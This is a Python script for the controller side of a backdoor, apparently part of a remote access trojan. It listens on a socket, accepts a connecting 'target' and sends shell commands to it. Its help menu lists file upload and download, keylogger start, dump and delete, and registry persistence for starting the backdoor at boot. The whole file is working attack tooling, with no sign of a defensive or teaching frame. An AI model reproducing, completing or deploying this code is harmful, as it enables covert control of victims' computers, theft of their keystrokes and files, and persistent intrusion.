import socket
from termcolor import colored
import json
import os

# function

def help():
    print(colored('''\n
    [-] info                                --> Target System Info
    [-] quit                                --> Quit current session
    [-] clear                               --> Clear screen (terminal)
    [-] cd *Directory Name*                 --> Change dir on target system
    [-] upload                              --> Upload files to target
    [-] download                            --> Download files from target
    [-] keylog_start                        --> Start keylogger
    [-] keylog_dump                         --> Print keylogger log
    [-] keylog_stop                         --> Stop and delete keylogger file
    [-] persistence *RegName* *FileName*    --> Create persistence in registry (automatically start backdoor on system boot)
    ''', 'green'))

def upload_file(file_name):
    f = open(file_name, 'rb') # content is transferred in bytes
    target.send(f.read())

def download_file(file_name):
    f = open(file_name, 'wb')
    target.settimeout(1) # give time to recv other bytes or break
    chunk = target.recv(1024)
    while chunk:
        f.write(chunk)
        try:
            chunk = target.recv(1024)
        except socket.timeout as e:
            break
    target.settimeout(None)
    f.close()

def safe_recv():
    data = '' # already decoded data and loaded as json
    while True:
        try:
            data = data + target.recv(1024).decode().rstrip()
            return json.loads(data)
        except ValueError:
            continue

def safe_send(data):
    json_data = json.dumps(data)
    target.send(json_data.encode())

def target_com():
    while True:
        command = input('# Shell~ %s: ' % str(ip))
        safe_send(command)
        if command == "quit":
            break
        elif command == "clear":
            os.system('clear')
        elif command == "help":
            help()
        elif command[:3] == "cd ":
            os.chdir(command[3:])
        elif command[:6] == "upload":
            upload_file(command[7:])
        elif command[:8] == "download":
            download_file(command[9:])
        else:
            result = safe_recv()
            print(result)

# socket connection
sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
sock.bind(('127.0.0.1', 4321)) # choose any IP address you wnat to bind the socket to and any free port
print(colored('[+] Listening for incoming connections', 'green'))
sock.listen(5)
target, ip = sock.accept()
print(colored('[+] Target connected from: ' + str(ip), 'green'))

target_com()
